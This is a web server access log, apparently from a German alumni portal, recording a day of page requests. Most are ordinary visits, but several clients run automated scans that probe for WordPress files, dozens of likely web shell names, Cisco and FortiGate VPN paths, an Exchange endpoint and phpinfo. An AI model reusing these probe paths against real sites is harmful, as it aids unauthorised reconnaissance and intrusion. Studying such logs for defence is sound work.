user;timestamp;referer;target;method;status
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:13;;/;GET;200
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:14;;//wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:15;;//xmlrpc.php?rsd;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:16;;/;GET;200
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:16;;//blog/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:17;;//web/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:18;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:18;;//website/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:18;;//wp/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:19;;//news/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:19;;//2018/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:20;;//2019/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:22;;//shop/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:23;;//wp1/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:23;;//test/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:23;;//media/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:24;;//wp2/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:24;;//site/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:24;;//cms/wp-includes/wlwmanifest.xml;GET;404
b5f1142c2836aa3eba5f18d2ff3f2a9169b753c245fc57e03997b142ed59053f;2025-11-11 09:53:24;;//sito/wp-includes/wlwmanifest.xml;GET;404
0b399015a9ce3f84df599e6854b14fa4162a6baa42cf73158380d1f1f622d0e9;2025-11-11 09:53:59;;/;GET;200
68dc3c989e6b531ede9c293187f37689d0b20a7704c450e978d5b22427b2ca4f;2025-11-11 10:00:25;;/personen/alumni/schule/5501;GET;200
917b54b9af66f4aa987a11df7b0dc6133e81ec6e7b12644c517fa5e84af2147f;2025-11-11 10:07:40;;/;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-11 10:08:29;;/;GET;200
28f9767c7fbaac70e5c933c56917e4fe9bda0dfd24522f87bec8990336546435;2025-11-11 10:13:56;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
b3f0ad22bd92d456e8ac1abe456a7d0d319ad625b214904a198a955736cfb010;2025-11-11 10:14:02;;/personen/alumni/schule/9002;GET;200
1c6cdc056737043b76364cf15f0422309bd299c621a37e259fe840b7e846369d;2025-11-11 10:19:49;;/;GET;200
0ade572e6b522ddcb8a16426e0ae35809fe803a1646eea32795ec153a6ba832c;2025-11-11 10:23:57;;/personen/alumni/schule/MP003;GET;200
c9abb61f543a97fb94c2bc446887f20baf29d0a3b96e8713f8f8d9c079fdecf2;2025-11-11 10:33:43;;/?page=docs-MA1-matrix.md;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-11 10:33:47;/themen/details/uni-zwischen-ebbe-und-flut;/themen/details/david-gegen-goliath;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-11 10:35:12;/gruppen/hobby/robotik;/personen/alumni/schule/0349;GET;200
0d70af07f80b83da451154ff1dc0e762d81adc3aefa8e0d86b0cdb5ff0a645f7;2025-11-11 10:35:17;;/personen/alumni/schule/03A04;GET;200
b707b41677ad854be3001da5931ed0c14e5c3e593b1cfad3bcab80a1f0bf43a4;2025-11-11 10:35:58;;/;GET;200
08e7d7bfa251c66b8c1a09291e27fbc014cc29bf2b6f2b92a631fe6c7fa90b78;2025-11-11 10:36:31;;/aktuelles/stellenangebote;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-11 10:36:34;/gruppen/hobby/robotik;/gruppen/hobby/fotografie;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-11 10:36:35;/gruppen/hobby/robotik;/gruppen;GET;200
32fcc052f707b89e5f7ee72d7797ef650bb84dd921d0e9bba5c877fe8352236c;2025-11-11 10:37:09;;/;GET;200
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:26;;/upfile.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:28;;/wp-conflg.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:29;;/bypass.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:29;;/404.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:31;;/updates.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:32;;/radio.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:33;;/xmrlpc.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:34;;/ae.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:35;;/moon.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:36;;/blog.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:38;;/themes.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:40;;/ini.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:41;;/as.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:42;;/shell.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:44;;/ws.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:45;;/1.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:46;;/123.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:47;;/9.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:49;;/aa.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:50;;/admin-ajax.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:51;;/adminfuns.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:52;;/akc.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:53;;/akcc.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:54;;/asasx.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:55;;/asd.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:56;;/atomlib.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:58;;/autoload_classmap.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:39:59;;/axx.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:00;;/berax.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:01;;/build.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:02;;/buy.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:03;;/checkbox.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:04;;/classwithtostring.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:05;;/cong.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:06;;/elp.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:07;;/file2.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:08;;/file4.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:09;;/filemanager.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:10;;/flower.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:11;;/form.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:11;;/gecko.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:13;;/goods.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:14;;/kyami.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:15;;/manager.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:16;;/mari.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:17;;/nc4.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:18;;/new.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:19;;/wp-admin.php;GET;404
0f9270e01586bb0279c1da549273099a3b70fd5d668cc6bdbb327f99b62bf20f;2025-11-11 10:40:20;;/xmlrpc.php;GET;404
a9e116d30cd5ccf5500fce256fa8cfe4cc5b5d589cd5e2a39b50ebbbbec16ae8;2025-11-11 10:42:12;/;/;GET;200
14fca039f6d723e1a3e9ddacbf5c2364768691dd3167691562f496ef950bb1d5;2025-11-11 10:44:41;;/;GET;200
4f9d7845bf0d8cdc932ac97c76ea4fdc6258b07095e2c51f225f129123e1becb;2025-11-11 10:45:21;;/veranstaltungen;GET;200
ac777adc1f8ccc564e1fcf2fff4908c7dc1a476e0a5d1e427b6f648aca9df976;2025-11-11 10:59:24;;/gruppen;GET;200
f55a527fd4b83a47b0856bbe074b1ccf42d7d4055085ca3ac514886fd3c0a1f0;2025-11-11 10:59:55;;/personen/alumni/schule/01A04;GET;200
8fee46e610df2686788f8e567b7c05ede908d828451a0da6d8a4199c57badb52;2025-11-11 11:03:56;;/personen/alumni/schule/164045;GET;200
9ce1629d9b9c92237336e1cc7e2ae586285da4ce7037f1cc8d25948d3fd815ce;2025-11-11 11:11:59;;/;GET;200
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-11 11:13:42;;/personen/alumni/schule/620014;GET;200
301e666ea0c944e347b624f4972b2b977e5cdb3645f451e1a71103667a2da7a8;2025-11-11 11:13:43;;/personen/alumni/schule/5820;GET;200
dfce045aa0c69690f4ca9aeb98520b978101317b09a40813e86e45e51633b14d;2025-11-11 11:13:45;;/;GET;200
dd6a48bd3dc8c29db21a231859ee6b5f0907283193ac818b49190b25ec8f50b7;2025-11-11 11:13:45;/;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-11 11:16:10;/gruppen/hobby/robotik;/gruppen/interesse/recht-und-verwaltung;GET;200
f4854f7ad1a7990b611853799b7e3e72d2c323a2e86caf2f2c44522fd774e717;2025-11-11 11:17:01;;/personen/alumni/schule/04A04;GET;200
445b9694feff53a457e5fbe896fb016c7a593aa22890881acaf07eff9ac4e989;2025-11-11 11:24:00;;/personen/alumni/schule/5505;GET;200
33117a9926739072b3d035d4f549e90eecf084f8a8d1268955519f60348be883;2025-11-11 11:32:58;;/themen?category=bildung;GET;200
564192c76ea7339d96b8522a128b9059e197a7b001266d74523476bc4e725d76;2025-11-11 11:33:55;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-11 11:34:05;/gruppen/hobby/robotik;/gruppen/hobby/theater-und-schauspiel;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-11 11:34:08;/gruppen/hobby/robotik;/gruppen;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-11 11:35:23;/gruppen/hobby/robotik;/gruppen/hobby/reisen;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-11 11:35:24;/gruppen/hobby/robotik;/gruppen;GET;200
f586d2e8c25a1911451ef44cde0ef5a1a570d4a9de3d07a52ed61a8c4d2d88e9;2025-11-11 11:36:19;;/personen/alumni/schule/170720;GET;200
7282a042f20678fe145fd3b911870fe8a72aff8baa35c8ddf74720dbfca28a42;2025-11-11 11:38:36;;/personen/alumni/schule/170720;GET;200
f652015e22cd7d9e99b02b2cf635a08deb1581bd28cdb365f7304d95939e47c2;2025-11-11 11:38:39;;/personen/alumni/schule/0348;GET;200
917e2ce768ddd61971f81829609fcabe5b1ae4d9b166b1a15e10571d4eea8434;2025-11-11 11:41:37;;/personen/alumni/schule/5508;GET;200
e8b3eefc24fd73bd60d872b5caa2c3a26caa3d4066ca09240104eeecc5a7b138;2025-11-11 11:45:34;/;/;GET;200
10952a79f14586459f85cc07308af825c4284cb953b7b317fdba0227ac0f1ca5;2025-11-11 11:48:19;;/rechtliches/green-data;GET;200
f0cab535b4832c1d8f3105e935e32f06c13cadb5ca0b8dbebe9054dd6e11ba35;2025-11-11 11:55:09;;/personen/alumni/schule/67945;GET;200
962523ce7d341bd35afebc8af2ff5d86592439058f8b8171641e7e004ce5e17b;2025-11-11 12:07:32;;/rechtliches/nutzungsbedingungen;GET;200
cfacb4e5e50604ac95984ffb0c6a0e71023c197992b5f31458698d035e245f71;2025-11-11 12:10:03;;/personen/alumni/schule/9009;GET;200
f652015e22cd7d9e99b02b2cf635a08deb1581bd28cdb365f7304d95939e47c2;2025-11-11 12:11:28;;/personen/alumni/schule/65262;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-11 12:13:15;/gruppen/hobby/robotik;/personen/alumni/schule/65286;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:22:59;;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:23:01;/;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:23:03;/profile;/gruppen/plausch/live-musik-und-bands;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:23:06;/gruppen/plausch/live-musik-und-bands;/gruppen/hobby/abschlussfest;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:23:07;/gruppen/hobby/abschlussfest;/gruppen/plausch/foyer;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:23:11;/gruppen/plausch/foyer;/gruppen/hobby/abschlussfest;GET;200
8343334af57fb45efa6e6060e792e572a60622c3506a87eba9ea1dff7f12f8cb;2025-11-11 12:24:14;;/personen/alumni/schule/MP004;GET;200
3ce1f5b360c68a0e762e82a5f6acb5b514d4323ad01133450ff4ae0ba0a17171;2025-11-11 12:30:59;;/aktuelles/stellenangebote;GET;200
2f8c496429140c54199dd80f6b9aecd6b3b68660fb4fc9a49dc59ad906dceb5d;2025-11-11 12:37:05;;/aktuelles/meldungen;GET;200
f86fd59f852be61e623ae2474de2113ec454b0b515f601031bda14bd0003f139;2025-11-11 12:38:10;;/_profiler/phpinfo;GET;404
8eef7b866483dace866fc85f75add67dcbd3666546a3d900b04380434de81f13;2025-11-11 12:43:18;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
1b60b90089f7e91b413e2d5090d939af718f326e1e2eba83d89d5a6455990e02;2025-11-11 12:43:45;;/;GET;200
ed179e1bac28674c703228cb82401e28cf5b1b1a6d7eccaf4311f3e0c4739641;2025-11-11 12:43:46;;/;GET;200
461e053d071a38d65a0e3c1049ff6cffbdd994915616bcc80792bbf762ae265a;2025-11-11 12:45:48;;/themen/details/abschied-aus-moabit;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-11 12:49:41;;/tr/;GET;404
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-11 12:53:28;/gruppen/hobby/robotik;/personen/alumni/schule/5826;GET;200
8a0d410f3d52aa6ab47e485fa1fc4060fa9f2aa0c06c667d2364c7588d7f82d9;2025-11-11 12:55:53;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-11 12:55:56;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
12276bd578982ee19df0c645d090adffe8d026974f206b3050ff28ce41b8ea23;2025-11-11 12:58:17;;/gruppen;GET;200
994974be93c1078be5d1f99e617585165555fc21fc68409055de47f4bfa0e47b;2025-11-11 12:59:08;;/;GET;200
6fecab6c3990452d959277cf4f31b3cd44a2a20e137167baee602bdd30c86dfd;2025-11-11 13:03:48;;/aktuelles/stellenangebote;GET;200
404b8ae57482a42363d372ede91ae2ba05dc1bc78e67e3003d0ccd4ad328ddf0;2025-11-11 13:05:32;;/personen/alumni/schule/5511;GET;200
d1896e50c87e55c7e981f87d925420a88fad97fdcc7df7f077f4a9f0935bdc47;2025-11-11 13:09:49;;/sitemap.xml;GET;200
d1896e50c87e55c7e981f87d925420a88fad97fdcc7df7f077f4a9f0935bdc47;2025-11-11 13:09:51;;/;GET;200
d1896e50c87e55c7e981f87d925420a88fad97fdcc7df7f077f4a9f0935bdc47;2025-11-11 13:09:53;;/sitemap.xml;GET;200
69d4429428864c08e6691cc91f073a2b485e7bca924e01b70834abec60b61c9e;2025-11-11 13:14:01;;/personen/alumni/schule/MP002;GET;200
e748fb691ef70f0d5239c24ac7599b288afc79a292862f6bba34987ea8a1b6f7;2025-11-11 13:14:09;;/;GET;200
66d9edcfd3aa6b052900f44f9b289a02e4298497a72804b7fbef34ebf74477c8;2025-11-11 13:15:38;;/personen;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-11 13:16:57;/gruppen/hobby/robotik;/rechtliches/green-data;GET;200
79c7a4b31d54995e32713689760fbccdeb6f3c3f9cca199458a47f746c7df10d;2025-11-11 13:18:18;;/remote/login?lang=en;GET;404
456250f9d41a64a2fa0ddb54db4ff4d9e06096219424657e9cf3eee786e49b30;2025-11-11 13:23:27;;/personen/alumni/schule/68457;GET;200
0d2812da44ce7f0d540b65e50c2c61658901c23a5f54de97c4eea4f355579b87;2025-11-11 13:34:18;;/personen/alumni/schule/67210;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-11 13:36:05;/gruppen/hobby/robotik;/personen/alumni/schule/4340014;GET;200
74bae9fc952c51076ff14fbd9939b0b720ad9cad77d8f731f959fb73f47e07b0;2025-11-11 13:42:02;;/;GET;200
61b85ab1af5528426229188065991373baf5e57579a57608e19d881e77c3bdea;2025-11-11 13:51:44;;/+CSCOL+/Java.jar;GET;404
61b85ab1af5528426229188065991373baf5e57579a57608e19d881e77c3bdea;2025-11-11 13:51:45;;/+CSCOE+/logon_forms.js;GET;404
61b85ab1af5528426229188065991373baf5e57579a57608e19d881e77c3bdea;2025-11-11 13:51:47;;/+CSCOL+/a1.jar;GET;404
61b85ab1af5528426229188065991373baf5e57579a57608e19d881e77c3bdea;2025-11-11 13:51:48;;/+CSCOE+/transfer.js;GET;404
b7cb715b4f039af35d28d1820f2699f9eaaa66cf499e9d3d3e7d2ef0bba2d9d2;2025-11-11 13:58:55;;/sitemap.xml;GET;200
73204545b9fc1e20f3a376c2d24ee1a139520e795cdfd3d4200b9a264cd3de60;2025-11-11 14:04:32;;/aktuelles/meldungen?category=community;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-11 14:09:18;/themen/details/uni-zwischen-ebbe-und-flut;/themen?category=bildung;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-11 14:10:43;/gruppen/hobby/robotik;/personen/alumni/schule/HB0002;GET;200
e1870690fe0060cff32529baf2d3a79340815ce14dced8a5b0a930325d70d027;2025-11-11 14:15:27;;/;GET;200
57ce1755969561156eb57b5f93feccc885eb82593dda4784e0db8211e7cf4a60;2025-11-11 14:15:54;;/gruppen/hobby/finanzbildung;GET;302
57ce1755969561156eb57b5f93feccc885eb82593dda4784e0db8211e7cf4a60;2025-11-11 14:15:55;/gruppen/hobby/finanzbildung;/gruppen;GET;200
9b5bd95d233953a8d4bac2fdc6885eef786c40d614e3d758daa7ea13a2ed5679;2025-11-11 14:24:19;;/;GET;200
0d70af07f80b83da451154ff1dc0e762d81adc3aefa8e0d86b0cdb5ff0a645f7;2025-11-11 14:26:42;;/gruppen/hobby/elektronikbasteln;GET;302
0d70af07f80b83da451154ff1dc0e762d81adc3aefa8e0d86b0cdb5ff0a645f7;2025-11-11 14:26:46;/gruppen/hobby/elektronikbasteln;/gruppen;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-11 14:29:37;;/tr/;GET;404
c9b9a3007f7491c4697cd5b7b362e3df5702646074aac9fbb19f2a2989046204;2025-11-11 14:30:06;;/;GET;200
14fca039f6d723e1a3e9ddacbf5c2364768691dd3167691562f496ef950bb1d5;2025-11-11 14:32:52;;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-11 14:34:49;/gruppen/hobby/robotik;/gruppen/interesse/selbststandigkeit;GET;200
2c25a83e5ed4d98912f269632202fc79d79b3e4c8435ae37a65379634cf4f50c;2025-11-11 14:37:16;;/;GET;200
48d8bbb4ab08e06f5a74df13e73a40b1060935723fa7f3ae4028c8a8d4616e17;2025-11-11 14:39:44;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
ced2d99d35686a84e897f9728aa084f2d179e8ecd40998e5ba37da2f6f21f3a7;2025-11-11 14:45:33;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
6d7fa02426edc0320c8fb5d2a415d256363ed91484762abbf625330a4f1f7bc2;2025-11-11 14:50:41;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
94d0b5e5812a36bed998f0115936d74241882d3d868819cf0c223498d4d4961c;2025-11-11 14:53:29;;/;GET;200
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-11 15:02:56;;/gruppen/hobby/sozialwissenschaften;GET;302
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-11 15:03:02;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
8507066b1e0828017ac9a01b5c689a33dacdcf96b9a0a6e45f60d277fd337012;2025-11-11 15:04:21;;/personen;GET;200
8b89e5fa4515e50ad82e7ad75af6d5397ee7a9a0054652c29757598376f26df1;2025-11-11 15:07:52;;/personen/alumni/schule/5514;GET;200
